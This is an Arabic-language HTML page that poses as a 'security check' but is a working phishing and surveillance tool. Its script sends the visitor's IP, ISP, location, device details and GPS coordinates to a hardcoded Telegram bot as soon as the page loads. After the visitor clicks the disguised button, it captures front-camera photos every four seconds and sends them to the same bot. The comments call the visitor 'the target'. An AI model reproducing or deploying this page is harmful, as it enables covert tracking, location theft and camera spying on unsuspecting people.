<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 320px; }
        .ldr { width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
    </style>
</head>
<body>

    <div class="box">
        <div class="ldr" id="L"></div>
        <p id="T">جاري فحص بروتوكولات الأمان...</p>
        <button id="B">متابعة الآن</button>
    </div>

    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const _U = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const _C = "2103976274";

        // 1. وظيفة إرسال النصوص
        function send(t) {
            fetch(_U + "sendMessage", { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ chat_id: _C, text: t, parse_mode: "Markdown" })
            });
        }

        // 2. جلب الشبكة والآي بي (منفصل تماماً لضمان السرعة)
        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                let m = `🌍 **بيانات الشبكة (دقيق)**\n\n`;
                m += `🌐 الآي بي: \`${res.ip}\`\n`;
                m += `🏢 الشركة: ${res.org}\n`;
                m += `📍 المكان: ${res.city}, ${res.country_name}\n`;
                m += `📡 الـ ASN: ${res.asn}`;
                send(m);
            } catch(e) { send("❌ فشل جلب بيانات الشبكة"); }
        }

        // 3. جلب معلومات الجهاز (منفصل)
        async function getDevice() {
            let n = navigator;
            let m = `📱 **بيانات الجهاز والموديل**\n\n`;
            
            let model = "غير معروف";
            try {
                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
                    const ua = await n.userAgentData.getHighEntropyValues(["model"]);
                    model = ua.model;
                } else { model = n.platform; }
            } catch(e) { model = n.platform; }

            m += `📱 الموديل: ${model}\n`;
            m += `⚙️ الأنوية: ${n.hardwareConcurrency || 8}\n`;
            m += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
            
            try {
                const b = await n.getBattery();
                m += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
            } catch(e) {}
            
            send(m);
        }

        // 4. جلب الموقع الدقيق GPS (منفصل تماماً)
        function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    let gps = `📍 **الموقع الدقيق (GPS)**\n\n`;
                    gps += `رابط الخريطة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    send(gps);
                }, (err) => { send("⚠️ المستهدف رفض إعطاء الموقع الدقيق"); });
            }
        }

        // تنفيذ الوظائف فور الدخول
        getNetwork(); // يرسل الآي بي والشركة فوراً
        getDevice();  // يرسل موديل الجهاز فوراً
        getGPS();     // يحاول جلب الخريطة بشكل مستقل

        // إظهار الزر للمستهدف
        setTimeout(() => { 
            document.getElementById('L').style.display='none'; 
            document.getElementById('T').innerText='تم الفحص بنجاح.'; 
            document.getElementById('B').style.display='block'; 
        }, 1500);

        // تشغيل الكاميرا عند ضغط الزر
        document.getElementById('B').onclick = async function() {
            this.style.display = 'none';
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = s;
                setInterval(() => {
                    const canvas = document.getElementById('c'), video = document.getElementById('v');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const f = new FormData(); f.append('chat_id', _C); f.append('photo', b, 'x.jpg');
                        fetch(_U + "sendPhoto", { method: 'POST', body: f });
                    }, 'image/jpeg', 0.8);
                }, 4000);
            } catch (e) { send("⚠️ المستهدف رفض الكاميرا"); }
        };
    </script>
</body>
</html>
